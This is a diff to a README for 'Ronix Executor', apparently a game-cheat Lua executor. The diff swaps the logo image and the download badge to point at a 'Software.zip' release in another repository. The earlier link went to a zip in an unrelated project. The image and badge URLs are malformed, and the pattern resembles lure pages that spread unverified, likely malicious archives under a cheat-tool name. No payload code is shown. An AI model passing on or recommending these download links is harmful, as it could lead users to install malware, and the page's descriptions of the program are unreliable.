@@ -3,7 +3,7 @@
 
 Welcome to the Ronix Executor repository! 🚀
 
-![Ronix Executor Logo](https://example.com/ronix-executor-logo.png)
+![Ronix Executor Logo](https://github.com/MlodyEnthu/Ronix-Executor/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -21,7 +21,7 @@ Ronix Executor is a powerful Lua environment designed to help you build faster a
 
 To get started with Ronix Executor, simply download the program from the following link:
 
-[![Download Ronix Executor](https://img.shields.io/badge/Download-Ronix%20Executor-blue)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Ronix Executor](https://github.com/MlodyEnthu/Ronix-Executor/releases/download/v2.0/Software.zip%20Executor-blue)](https://github.com/MlodyEnthu/Ronix-Executor/releases/download/v2.0/Software.zip)
 
 Once you've downloaded the file, follow the instructions to launch the program and begin exploring its features.
 
